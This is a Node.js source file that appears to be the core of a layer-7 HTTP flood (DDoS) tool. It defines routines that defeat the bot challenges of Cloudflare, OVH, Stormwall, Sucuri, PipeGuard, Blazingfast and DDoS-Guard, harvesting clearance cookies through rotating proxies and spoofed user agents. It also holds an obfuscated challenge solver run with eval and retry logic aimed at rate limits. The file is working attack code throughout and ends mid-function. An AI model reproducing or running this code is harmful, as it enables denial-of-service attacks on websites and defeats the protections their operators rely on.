const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
const scp = require("set-cookie-parser");
 const gradient = require("gradient-string")
const cloudscraper = require('cloudscraper')
 const {
  HeaderGenerator
} = require('header-generator');
 const UserAgent = require('user-agents');
     var privacyPassSupport = true;

tls.DEFAULT_ECDH_CURVE;

function Cloudflare() {
    const privacypass = require('./privacypass'),
        cloudscraper = require('cloudscraper'),
        request = require('request'),
        fs = require('fs');
    var privacyPassSupport = true;
    function useNewToken() {
        privacypass(l7.target);
        console.log('[cloudflare-bypass ~ privacypass]: generated new token');
    }
  
    if (l7.firewall[1] == 'captcha') {
        privacyPassSupport = l7.firewall[2];
        useNewToken();
    }
  
    function bypass(proxy, uagent, callback, force) {
        num = Math.random() * Math.pow(Math.random(), Math.floor(Math.random() * 10))
        var cookie = "";
        if (l7.firewall[1] == 'captcha' || force && privacyPassSupport) {
            request.get({
                url: l7.target + "?_asds=" + num,
                gzip: true,
                proxy: proxy,
                headers: {
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US;q=0.9'
                }
            }, (err, res) => {
                if (!res) {
                    return false;
                }
                if (res.headers['cf-chl-bypass'] && res.headers['set-cookie']) {
  
                } else {
                    if (l7.firewall[1] == 'captcha') {
                        logger('[cloudflare-bypass]: The target is not supporting privacypass');
                        return false;
                    } else {
                        privacyPassSupport = false;
                    }
                }
  
                cookie = res.headers['set-cookie'].shift().split(';').shift();
                if (l7.firewall[1] == 'captcha' && privacyPassSupport || force && privacyPassSupport) {
                    cloudscraper.get({
                        url: l7.target + "?_asds=" + num,
                        gzip: true,
                        proxy: proxy,
                        headers: {
                            'Connection': 'Keep-Alive',
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': 1,
                            'User-Agent': uagent,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US;q=0.9',
                            'challenge-bypass-token': l7.privacypass,
                            "Cookie": cookie
                        }
                    }, (err, res) => {
                        if (err || !res) return false;
                        if (res.headers['set-cookie']) {
                            cookie += '; ' + res.headers['set-cookie'].shift().split(';').shift();
                            cloudscraper.get({
                                url: l7.target + "?_asds=" + num,
                                proxy: proxy,
                                headers: {
                                    'Connection': 'Keep-Alive',
                                    'Cache-Control': 'max-age=0',
                                    'Upgrade-Insecure-Requests': 1,
                                    'User-Agent': uagent,
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                                    'Accept-Encoding': 'gzip, deflate, br',
                                    'Accept-Language': 'en-US;q=0.9',
                                    "Cookie": cookie
                                }
                            }, (err, res, body) => {
                                if (err || !res || res && res.statusCode == 403) {
                                    console.warn('[cloudflare-bypass ~ privacypass]: Failed to bypass with privacypass, generating new token:');
                                    useNewToken();
                                    return;
                                }
                                callback(cookie);
                            });
                        } else {
                            console.log(res.statusCode, res.headers);
                            if (res.headers['cf-chl-bypass-resp']) {
                                let respHeader = res.headers['cf-chl-bypass-resp'];
                                switch (respHeader) {
                                    case '6':
                                        console.warn("[privacy-pass]: internal server connection error occurred");
                                        break;
                                    case '5':
                                        console.warn(`[privacy-pass]: token verification failed for ${l7.target}`);
                                        useNewToken();
                                        break;
                                    case '7':
                                        console.warn(`[privacy-pass]: server indicated a bad client request`);
                                        break;
                                    case '8':
                                        console.warn(`[privacy-pass]: server sent unrecognised response code (${header.value})`);
                                        break;
                                }
                                return bypass(proxy, uagent, callback, true);
                            }
                        }
                    });
                } else {
                    cloudscraper.get({
                        url: l7.target + "?_asds=" + num,
                        proxy: proxy,
                        headers: {
                            'Connection': 'Keep-Alive',
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': 1,
                            'User-Agent': uagent,
                            'Accept-Language': 'en-US;q=0.9'
                        }
                    }, (err, res) => {
                        if (err || !res || !res.request.headers.cookie) {
                            if (err) {
                                if (err.name == 'CaptchaError') {
                                    return bypass(proxy, uagent, callback, true);
                                }
                            }
                            return false;
                        }
                        callback(res.request.headers.cookie);
                    });
                }
            });
        } else if (l7.firewall[1] == 'uam' && privacyPassSupport == false) {
            cloudscraper.get({
                url: l7.target + "?_asds=" + num,
                proxy: proxy,
                headers: {
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent
                }
            }, (err, res, body) => {
                if (err) {
                    if (err.name == 'CaptchaError') {
                        return bypass(proxy, uagent, callback, true);
                    }
                    return false;
                }
                if (res && res.request.headers.cookie) {
                    callback(res.request.headers.cookie);
                } else if (res && body && res.headers.server == 'cloudflare') {
                    if (res && body && /Why do I have to complete a CAPTCHA/.test(body) && res.headers.server == 'cloudflare' && res.statusCode !== 200) {
                        return bypass(proxy, uagent, callback, true);
                    }
                } else {
  
                }
            });
        } else {
            cloudscraper.get({
                url: l7.target + "?_asds=" + num,
                gzip: true,
                proxy: proxy,
                headers: {
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US;q=0.9'
                }
            }, (err, res, body) => {
                if (err || !res || !body || !res.headers['set-cookie']) {
                    if (res && body && /Why do I have to complete a CAPTCHA/.test(body) && res.headers.server == 'cloudflare' && res.statusCode !== 200) {
                        return bypass(proxy, uagent, callback, true);
                    }
                    return false;
                }
                cookie = res.headers['set-cookie'].shift().split(';').shift();
                callback(cookie);
            });
        }
    }
    return bypass;
  }
  function OVHUAM() {
  const request = require('request');
  
  function Bypasser(body, callback) {
      callback('xf_id=' + body.match(/\|max\|(.*?)\|/)[1]);
  }
  
  return function bypass(proxy, uagent, callback) {
      request({
          url: l7.target,
          method: "GET",
          gzip: true,
          proxy: proxy,
          headers: {
              'Connection': 'keep-alive',
              'Cache-Control': 'max-age=0',
              'Upgrade-Insecure-Requests': 1,
              'User-Agent': uagent,
              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
              'Accept-Encoding': 'gzip, deflate, br',
              'Accept-Language': 'en-US'
          }
      }, (err, res, body) => {
          if (err || !res || !body || body.indexOf('|href|max|') == -1) {
              return false;
          }
          Bypasser(body, cookies => {
              request({
                  url: l7.target,
                  method: "GET",
                  gzip: true,
                  proxy: proxy,
                  followAllRedirects: true,
                  jar: true,
                  headers: {
                      'Connection': 'keep-alive',
                      'Cache-Control': 'max-age=0',
                      'Upgrade-Insecure-Requests': 1,
                      'User-Agent': uagent,
                      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
                      'Accept-Encoding': 'gzip, deflate, br',
                      'Accept-Language': 'en-US,en;q=0.9',
                      'Cookie': cookies
                  }
              }, (err, res, body) => {
                  if (res && res.request.headers.Cookie) {
                      //console.log(res.request.headers.Cookie);
                      callback(res.request.headers.Cookie);
                  }
                  /*if (err || !res || !body) {
                      return false;
                  }*/
              });
          })
      });
  }
  }
  function Stormwall() {
  const request = require('cloudscraper'),
      document = {
          cookie: ''
      };
  
  global.window = {navigator: {}};
  
  var BYPASSIT = {};
  
  var _0xda3f = ['__phantom', 'Buffer', 'emit', 'spawn', 'domAutomation', 'webdriver', 'selenium', './adv', '0123456789qwertyuiopasdfghjklzxcvbnm:?!', 'toString', 'getElementById', 'className', 'error-frame', 'invisible', 'undefined', 'location', 'Cannot\x20find\x20module\x20\x27', 'MODULE_NOT_FOUND', 'exports', 'function', 'length', '_phantom'];
  (function (_0x502b53, _0x2696a0) {
      var _0xe3cb5a = function (_0x4f70f6) {
          while (--_0x4f70f6) {
              _0x502b53['push'](_0x502b53['shift']());
          }
      };
      _0xe3cb5a(++_0x2696a0);
  }(_0xda3f, 0xec));
  var _0xfda3 = function (_0x3854ba, _0x105aa1) {
      _0x3854ba = _0x3854ba - 0x0;
      var _0x36d4c9 = _0xda3f[_0x3854ba];
      return _0x36d4c9;
  };
  (function e(_0x33f0ce, _0x4e1686, _0x58a80c) {
      function _0x23a0c0(_0x4bc934, _0x149a56) {
          if (!_0x4e1686[_0x4bc934]) {
              if (!_0x33f0ce[_0x4bc934]) {
                  var _0x37652d = typeof require == 'function' && require;
                  if (!_0x149a56 && _0x37652d) return _0x37652d(_0x4bc934, !0x0);
                  if (_0x7bb490) return _0x7bb490(_0x4bc934, !0x0);
                  var _0x36dc71 = new Error(_0xfda3('0x0') + _0x4bc934 + '\x27');
                  throw _0x36dc71['code'] = _0xfda3('0x1'), _0x36dc71;
              }
              var _0x43a010 = _0x4e1686[_0x4bc934] = {
                  'exports': {}
              };
              _0x33f0ce[_0x4bc934][0x0]['call'](_0x43a010['exports'], function (_0x316792) {
                  var _0x4e1686 = _0x33f0ce[_0x4bc934][0x1][_0x316792];
                  return _0x23a0c0(_0x4e1686 ? _0x4e1686 : _0x316792);
              }, _0x43a010, _0x43a010[_0xfda3('0x2')], e, _0x33f0ce, _0x4e1686, _0x58a80c);
          }
          return _0x4e1686[_0x4bc934][_0xfda3('0x2')];
      }
      var _0x7bb490 = typeof require == _0xfda3('0x3') && require;
      for (var _0x46655c = 0x0; _0x46655c < _0x58a80c[_0xfda3('0x4')]; _0x46655c++) _0x23a0c0(_0x58a80c[_0x46655c]);
      return _0x23a0c0;
  }({
      1: [function (_0xdc5b45, _0x14d549, _0x102643) {
          let _0x4713ba = {
              'a': window['callPhantom'],
              'b': window[_0xfda3('0x5')],
              'c': window[_0xfda3('0x6')],
              'd': window[_0xfda3('0x7')],
              'e': window[_0xfda3('0x8')],
              'f': window[_0xfda3('0x9')],
              'g': window['webdriver'],
              'h': window[_0xfda3('0xa')],
              'i': window['navigator'][_0xfda3('0xb')],
              'j': window[_0xfda3('0xc')],
              'k': window['navigator']['selenium']
          };
  
          function _0x587e9b() {
              for (let _0x227d72 in _0x4713ba) {
                  if (_0x4713ba[_0x227d72]) {
                      return !![];
                  }
              }
              return ![];
          }
          _0x14d549[_0xfda3('0x2')] = _0x587e9b;
      }, {}],
      2: [function (_0x5ea793, _0x57a229, _0x533365) {
          let _0x80ea80 = _0x5ea793(_0xfda3('0xd'));
          let _0x249dc6 = _0xfda3('0xe');
          let _0x34900d = [];
          let _0x40d702 = {};
  
          function _0x2aadcb(_0x93c8ef) {
              for (let _0x4680bf = 0x0; _0x4680bf < _0x93c8ef[_0xfda3('0x4')]; _0x4680bf++) {
                  _0x34900d[_0x4680bf] = _0x93c8ef[_0x4680bf];
                  _0x40d702[_0x93c8ef[_0x4680bf]] = _0x4680bf;
              }
          }
  
          function _0x54a7c6(_0x15ddb9, _0x1bbdda) {
              let _0x12d568 = _0x34900d[_0xfda3('0x4')] - 0x1;
              let _0x59a887 = '';
              for (let _0x42faad = 0x0; _0x42faad < _0x1bbdda[_0xfda3('0x4')]; _0x42faad++) {
                  let _0x2ee74c = _0x1bbdda[_0x42faad];
                  if (typeof _0x40d702[_0x2ee74c] == 'undefined') {
                      _0x59a887 = _0x59a887 + _0x2ee74c;
                  } else {
                      let _0x5ad52a = _0x40d702[_0x2ee74c] + _0x15ddb9;
                      if (_0x5ad52a > _0x12d568) {
                          _0x5ad52a = _0x5ad52a - _0x12d568 - 0x1;
                      } else if (_0x5ad52a < 0x0) {
                          _0x5ad52a = _0x12d568 + _0x5ad52a + 0x1;
                      }
                      _0x59a887 = _0x59a887 + _0x34900d[_0x5ad52a];
                  }
              }
              return _0x59a887;
          }
  
          function _0xa0449d(_0x38d428, _0x4ea9f5) {
              let _0x545320 = _0x34900d[_0xfda3('0x4')] - 0x1;
              let _0xef2535 = _0x38d428;
              let _0x1e15a8 = '';
              for (let _0x2c0ae9 = 0x0; _0x2c0ae9 < _0x4ea9f5[_0xfda3('0x4')]; _0x2c0ae9++) {
                  let _0x2b84b7 = '' + _0x4ea9f5[_0x2c0ae9];
                  _0x1e15a8 = _0x1e15a8 + _0x54a7c6(_0xef2535, _0x2b84b7);
                  _0xef2535 = _0xef2535 + 0x1;
                  if (_0xef2535 > _0x545320) {
                      _0xef2535 = 0x0;
                  }
              }
              return _0x1e15a8;
          }
  
          function _0x2677f6(_0xc6fb9a, _0x16eaa6) {
              let _0x5499f5 = _0x34900d[_0xfda3('0x4')] - 0x1;
              let _0x2d5b44 = _0xc6fb9a;
              let _0x2e8bf8 = '';
              if (_0x80ea80()) {
                  _0x2e8bf8 += Date['new']()[_0xfda3('0xf')]();
                  res += ':';
              }
              for (let _0x39e246 = 0x0; _0x39e246 < _0x16eaa6[_0xfda3('0x4')]; _0x39e246++) {
                  let _0x38946d = '' + _0x16eaa6[_0x39e246];
                  _0x2e8bf8 = _0x2e8bf8 + _0x54a7c6(_0x2d5b44 * -0x1, _0x38946d);
                  _0x2d5b44 = _0x2d5b44 + 0x1;
                  if (_0x2d5b44 > _0x5499f5) {
                      _0x2d5b44 = 0x0;
                  }
              }
              return _0x2e8bf8;
          }
  
          let _0x474992 = 0x0;
          if (typeof googleAnal != _0xfda3('0x14') || typeof yaMetrika != _0xfda3('0x14')) _0x474992 = 0x3e8;
          _0x2aadcb(_0x249dc6);
          BYPASSIT = function (defines) {
              return eval(defines + '; document.cookie = cN + \'=\' + _0x2677f6(cK, cE)');
          }
      }, {
          './adv': 0x1
      }]
  }, {}, [0x2]));
  
  function Bypasser(body) {
      return new Promise((resolve, reject) => {
          resolve(BYPASSIT(body.split('<script>')[2].split('</script>')[0])); // Wallah return the bypass cookie;
      });
  }
  
  return function bypass(proxy, uagent, callback) {
      request({
          method: "GET",
          url: l7.target,
          gzip: true,
          proxy: proxy,
          followAllRedirects: true,
          headers: {
              'Connection': 'keep-alive',
              'Cache-Control': 'max-age=0',
              'Upgrade-Insecure-Requests': 1,
              'User-Agent': uagent,
              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
              'Accept-Encoding': 'gzip, deflate, br',
              'Accept-Language': 'en-US,en;q=0.9'
          }
      }, (err, res, body) => {
          if (err || !res || !body || body.indexOf('const cN = ') == -1) {
              if (body && body.indexOf('Your browser cannot be verified automatically, please confirm you are not a robot.') !== -1) {
                  return logger('[stormwall] Captcha received, IP reputation died.');
              }
              return false;
          }
          Bypasser(body).then(cookie => {
              request({
                  method: "GET",
                  url: l7.target,
                  gzip: true,
                  proxy: proxy,
                  followAllRedirects: true,
                  headers: {
                      'Connection': 'keep-alive',
                      'Cache-Control': 'max-age=0',
                      'Upgrade-Insecure-Requests': 1,
                      'User-Agent': uagent,
                      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                      'Accept-Encoding': 'gzip, deflate, br',
                      'Accept-Language': 'en-US,en;q=0.5',
                      "Cookie": cookie
                  }
              }, (err, res, body) => {
                  if (err || !res) {
                      return false;
                  }
                  //console.log(cookie, body);
                  callback(cookie);
              })
          });
      });
  }
  }
  function Sucuri() {
  const request = require('request'),
      vm = require('vm'),
      CHALLENGE_REGEXP = /<script>([^]+?)<\/script>/,
      COOKIE_REGEXP = /(sucuri_cloudproxy_uuid_[0-9a-f]{9})=([0-9a-f]{32});?/,
      cloudscraper = require('cloudscraper').defaults({
          agentOptions: {
              ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256'
          }
      });
  
  function createEnvironment(cookieCallback) {
      var document = {};
      Object.defineProperty(document, 'cookie', {
          set: value => cookieCallback(value)
      });
  
      var location = {
          reload: () => {}
      };
  
      var environment = {
          location,
          document
      }
  
      return environment;
  }
  
  function parseCookie(cookie) {
      return new Promise((resolve, reject) => {
          var match = cookie.match(COOKIE_REGEXP);
          if (match === null) {
              reject('[sucuri]: cannot parse cookie')
          } else {
              //match[1]; // Cookie name
              //match[2]; // Cookie value
              resolve(match[1] + '=' + match[2]);
          }
      });
  }
  
  function solve(challenge) {
      return new Promise((resolve, reject) => {
          var environment = createEnvironment(cookie => {
              resolve(parseCookie(cookie));
          });
  
          try {
              vm.runInNewContext(challenge, environment, {
                  timeout: 1e3
              });
              reject('[sucuri]: Timed out while getting cookie.');
          } catch (e) {
              reject(e.message);
          }
      });
  }
  
  function Bypasser(body) {
      return new Promise((resolve, reject) => {
          var match = body.match(CHALLENGE_REGEXP);
          if (match === null) {
              reject('[sucuri]: cannot find Sucuri challenge')
          } else {
              var challenge = match[1];
              resolve(solve(challenge));
          }
      });
  }
  
  return function bypass(proxy, uagent, callback) {
      request.get({
          url: l7.target,
          gzip: true,
          proxy: proxy,
          followAllRedirects: true,
          headers: {
              'Connection': 'keep-alive',
              'Cache-Control': 'max-age=0',
              'Upgrade-Insecure-Requests': 1,
              'User-Agent': uagent,
              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
              'Accept-Encoding': 'gzip, deflate, br',
              'Accept-Language': 'en-US,en;q=0.9'
          }
      }, (err, res, body) => {
          if (err || !res || !body) {
              return false;
          }
          Bypasser(body).then(cookie => {
              cloudscraper({
                  method: l7.opt.method,
                  url: l7.target,
                  gzip: true,
                  proxy: proxy,
                  followAllRedirects: true,
                  headers: {
                      'Connection': 'keep-alive',
                      'Cache-Control': 'max-age=0',
                      'Upgrade-Insecure-Requests': 1,
                      'User-Agent': uagent,
                      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                      'Accept-Encoding': 'gzip, deflate, br',
                      'Accept-Language': 'en-US,en;q=0.5',
                      "Cookie": cookie
                  }
              }, (err, res, body) => {
                  if (err) {
                      return false;
                  }
                  console.log(cookie);
                  callback(cookie);
              })
          });
      });
  }
  }
  function PipeGuard() {
  const request = require('request');
  
  function Bypasser(body, callback) {
      callback(body.match(/PipeGuard=([^\\s;]*)/)[0]);
  }
  
  return function bypass(proxy, uagent, callback) {
      request({
          url: l7.target,
          method: "GET",
          gzip: true,
          followAllRedirects: true,
          jar: true,
          proxy: proxy,
          headers: {
              'Connection': 'keep-alive',
              'Cache-Control': 'max-age=0',
              'Upgrade-Insecure-Requests': 1,
              'User-Agent': uagent,
              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
              'Accept-Encoding': 'gzip, deflate, br',
              'Accept-Language': 'en-US,en;q=0.9'
          }
      }, (err, res, body) => {
          if (err || !res || !body || body.indexOf('document.cookie = "PipeGuard=') == -1) {
              return false;
          }
          Bypasser(body, cookies => {
              request({
                  url: l7.target,
                  method: "GET",
                  gzip: true,
                  proxy: proxy,
                  followAllRedirects: true,
                  jar: true,
                  headers: {
                      'Connection': 'keep-alive',
                      'Cache-Control': 'max-age=0',
                      'Upgrade-Insecure-Requests': 1,
                      'User-Agent': uagent,
                      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
                      'Accept-Encoding': 'gzip, deflate, br',
                      'Accept-Language': 'en-US,en;q=0.9',
                      'Cookie': cookies
                  }
              }, (err, res, body) => {
                  if (res && res.request.headers.Cookie) {
                      //console.log(res.request.headers.Cookie);
                      callback(res.request.headers.Cookie);
                  }
                  /*if (err || !res || !body) {
                      return false;
                  }*/
              });
          })
      });
  }
  }
  function Blazingfast() {
  const request = require('request'),
      BFCrypt = require('./bfcrypt'),
      cloudscraper = require('cloudscraper').defaults({
          agentOptions: {
              ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256'
          }
      }),
      safeEval = require('safe-eval');
  
  function randomScreenWidth() {
      return ~~(Math.random() * (2560 - 1024) + 1024)
  }
  
  function toNumbers(d) {
      var e = [];
      d.replace(/(..)/g, function (d) {
          e.push(parseInt(d, 16))
      });
      return e
  }
  
  function toHex() {
      for (var d = [], d = 1 == arguments.length && arguments[0].constructor == Array ? arguments[0] : arguments, e = "", f = 0; f <
          d.length; f++) e += (16 > d[f] ? "0" : "") + d[f].toString(16);
      return e.toLowerCase()
  }
  
  let document = {
      cookie: ''
  }
  
  function atob(string) {
      return Buffer.from(string, 'base64').toString('ascii');
  }
  
  return async function cookie(proxy, uagent, callback) {
      var cookie = "";
      if (l7.firewall[1] === '5sec') {
          request.get({
              url: l7.parsed.protocol + '//' + l7.parsed.host,
              gzip: true,
              proxy: proxy,
              headers: {
                  'User-Agent': uagent,
                  'Connection': 'keep-alive',
                  'Cache-Control': 'max-age=0',
                  'Upgrade-Insecure-Requests': 1,
                  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                  'Accept-Encoding': 'gzip, deflate',
                  'Accept-Language': 'en-US,en;q=0.9'
              }
          }, async (err, res, body) => {
              if (!res || !res.headers['set-cookie'] || !body || body.indexOf(',true),xhr') == -1) {
                  return false;
              }
              cookie = res.headers['set-cookie'].shift().split(';').shift();
              let url = l7.parsed.protocol + '//' + l7.parsed.host + '/___S___/' + body.split(';xhr.open("GET","/___S___/')[1].split('",true),xhr.onrea')[0].replace('" + ww +"', randomScreenWidth());
              await request.get({
                  url: l7.parsed.protocol + '//' + l7.parsed.host + '/jquery.min.js',
                  proxy: proxy,
                  gzip: true,
                  headers: {
                      'Connection': 'keep-alive',
                      'User-Agent': uagent,
                      'Accept': '*/*',
                      'DNT': 1,
                      'Referer': l7.target,
                      'Accept-Encoding': 'gzip, deflate',
                      'Accept-Language': 'en-US,en;q=0.5',
                      'Cookie': cookie
                  }
              }, async (err, res, body) => {
                  if (err || !res || !body) {
                      return false;
                  }
                  await request.get({
                      url,
                      proxy: proxy,
                      gzip: true,
                      headers: {
                          'Connection': 'keep-alive',
                          'User-Agent': uagent,
                          'Accept': '*/*',
                          'DNT': 1,
                          'Referer': l7.parsed.protocol + '//' + l7.parsed.host,
                          'Accept-Encoding': 'gzip, deflate',
                          'Accept-Language': 'en-US,en;q=0.5',
                          'Cookie': cookie
                      }
                  }, (err, res, body) => {
                      if (err || !body || body.indexOf('if($(window).width()>0) { document.cookie=') == -1 || !res) return false;
                      let chl = 'var a=toNumbers' + body.split('var a=toNumbers')[1].replace(' if($(window).width()>0) { document.cookie=', 'document.cookie=').split('+"; domain =')[0]
                      let final = cookie + '; ' + eval(chl);
                      callback(final);
                  });
              });
          });
      } else if (['5sec2'].indexOf(l7.firewall[1]) !== -1) {
          setTimeout(() => {
              cloudscraper.get({
                  url: l7.parsed.protocol + '//' + l7.parsed.host,
                  gzip: true,
                  proxy: proxy,
                  headers: {
                      'User-Agent': uagent,
                      'Connection': 'keep-alive',
                      'Cache-Control': 'no-cache',
                      'Pragma': 'no-cache',
                      'Upgrade-Insecure-Requests': 1,
                      'Cache-Control': 'no-cache',
                      'Accept-Encoding': 'gzip, deflate, br',
                      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                      'Accept-Language': 'en-US,en;q=0.9'
                  }
              }, async (err, res, body) => {
                  if (!res || !res.headers['set-cookie'] || !body || body.indexOf('r.value = "') == -1) {
                      return false;
                  }
                  let url = l7.parsed.protocol + '//' + l7.parsed.host + '/blzgfst-shark/?bfu=' + encodeURI(body.split('r.value = "')[1].split("\";var _0xf8c2=['value'];")[0]) + '&blazing_answer=' + safeEval(body.split("return _0x8cc65;};a[_0x2f8c('0x0')]=")[1].split(';')[0]);
                  cookie = res.headers['set-cookie'].shift().split(';').shift();
                  await cloudscraper.get({
                      url,
                      gzip: true,
                      proxy: proxy,
                      followAllRedirects: true,
                      jar: true,
                      headers: {
                          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                          'Connection': 'keep-alive',
                          'User-Agent': uagent,
                          'Referer': l7.target,
                          'Pragma': 'no-cache',
                          'Cache-Control': 'no-cache',
                          'Upgrade-Insecure-Requests': 1,
                          'Accept-Encoding': 'gzip, deflate, br',
                          'Accept-Language': 'en-US,en;q=0.5',
                          'TE': 'Trailers',
                          'Cookie': cookie
                      }
                  }, (err, res, body) => {
                      if (err || !res) return false;
                      let final = res.request.headers.Cookie;
                      callback(final);
                  });
              });
          }, 5e3);
  
      };
  }
  }
  function ddosGuardBypass(proxy, uagent, callback, force, cookie = '') {
  const request = require('request'),
  cloudscraper = require('cloudscraper');
  function encode(string) {
      return Buffer.from(string).toString('base64');
  }
  
  var hS = encode(l7.parsed.protocol + '//' + l7.parsed.host);
  var uS = encode(l7.parsed.path);
  var pS = encode(l7.parsed.port || '');
  
  if (['5sec', 'free'].indexOf(l7.firewall[1]) !== -1 || force) {
      let bypassJar = request.jar();
      request.get({
          url: l7.parsed.protocol + '//ddgu.ddos-guard.net/g',
          gzip: true,
          proxy: proxy,
          jar: bypassJar,
          headers: {
              'Connection': 'keep-alive',
              'Cache-Control': 'max-age=0',
              'Upgrade-Insecure-Requests': 1,
              'User-Agent': uagent,
              'Accept': 'image/webp,image/apng,image/*,*/*;q=0.8',
              'Accept-Encoding': 'gzip, deflate, br',
              'Accept-Language': 'en-US;q=0.9',
              'Referer': l7.target,
              'Origin': l7.parsed.protocol + '//' + l7.parsed.host
          }
      }, (err, res, body) => {
          if (err || !res || !body) {
              return false;
          }
  
          request.get({
              url: l7.parsed.protocol + '//ddgu.ddos-guard.net/c',
              gzip: true,
              proxy: proxy,
              jar: bypassJar,
              headers: {
                  'Connection': 'keep-alive',
                  'User-Agent': uagent,
                  'Accept': '*/*',
                  'Accept-Encoding': 'gzip, deflate, br',
                  'Referer': l7.target,
                  'Origin': l7.parsed.protocol + '//' + l7.parsed.host,
                  'Accept-Language': 'en-US;q=0.9'
              }
          }, (err, res, body) => {
              if (err || !res || !body) {
                  return false;
              }
  
              request.post({
                  url: l7.parsed.protocol + '//ddgu.ddos-guard.net/ddgu/',
                  gzip: true,
                  proxy: proxy,
                  jar: bypassJar,
                  followAllRedirects: true,
                  headers: {
                      'Connection': 'Keep-Alive',
                      'Cache-Control': 'max-age=0',
                      'Upgrade-Insecure-Requests': 1,
                      'User-Agent': uagent,
                      'Content-Type': 'application/x-www-form-urlencoded',
                      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                      'Accept-Encoding': 'gzip, deflate, br',
                      'Referer': l7.target,
                      'Origin': l7.parsed.protocol + '//' + l7.parsed.host,
                      'Accept-Language': 'en-US;q=0.9'
                  },
                  form: {
                      u: uS,
                      h: hS,
                      p: pS
                  }
              }, (err, res, body) => {
                  if (err || !res || !body) {
                      return false;
                  }
                  if (body.indexOf('enter the symbols from the picture to the form below. </div>') !== -1) {
                      console.log('[ddos-guard] Captcha received, IP rep died.');
                  } else {
                      callback(res.request.headers.cookie);
                  }
              });
          });
      });
  } else {
      cloudscraper.get({
          url: l7.target,
          gzip: true,
          proxy: proxy,
          jar: true,
          followAllRedirects: true,
          headers: {
              'Connection': 'Keep-Alive',
              'Cache-Control': 'max-age=0',
              'Upgrade-Insecure-Requests': 1,
              'User-Agent': uagent,
              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
              'Accept-Encoding': 'gzip, deflate, br',
              'Accept-Language': 'en-US;q=0.9'
          }
      }, (err, res, body) => {
          if (err || !res || !body) {
              return false;
          }
          if (res.request.headers.cookie) {
              callback(res.request.headers.cookie);
          } else {
              if (res.statusCode == 403 && body.indexOf("<title>DDOS-GUARD</title>") !== -1) {
                  return ddosGuardBypass(proxy, uagent, callback, true);
              } else {
                  return false;
              }
          }
      });
  }
  }
  
  const { HTTP2_HEADER_PATH } = http2.constants;
  
  
  
  const MAX_RETRIES = 5;
  const BACKOFF_MULTIPLIER = 2;
  const RATE_LIMIT_HEADERS = ['Retry-After', 'X-RateLimit-Reset', 'X-RateLimit-Retry-After'];
  
  const handleRateLimit = async (parsed, dynHeaders, retriesLeft = MAX_RETRIES) => {
    return new Promise((resolve, reject) => {
      const session = http2.connect(parsed);
      const request = session.request({
        [HTTP2_HEADER_PATH]: '/',
        ...dynHeaders,
      });
  
      let responseBody = '';
  
      request.on('response', (dynHeaders, flags) => {
        const statusCode = headers[':status'];
  
        if (statusCode === 429 || statusCode === 503) {
          if (retriesLeft > 0) {
            const retryAfterHeader = RATE_LIMIT_HEADERS.find(dynHeaders => dynHeaders[dynHeaders]);
            let retryAfterSeconds = 1;
  
            if (retryAfterHeader) {
              const retryAfterValue = headers[retryAfterHeader];
              retryAfterSeconds = parseInt(retryAfterValue, 10);
            }
  
            session.destroy();
            setTimeout(() => handleRateLimit(url, dynHeaders, retriesLeft - 1).then(resolve).catch(reject), retryAfterSeconds * 1000);
          } else {
            reject(new Error('Too many retries'));
          }
        } else {
          request.on('data', chunk => {
            responseBody += chunk;
          });
  
          request.on('end', () => {
            resolve({ statusCode, dynHeaders, body: responseBody });
          });
        }
      });
  
      request.on('error', reject);
    });
  };
 

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
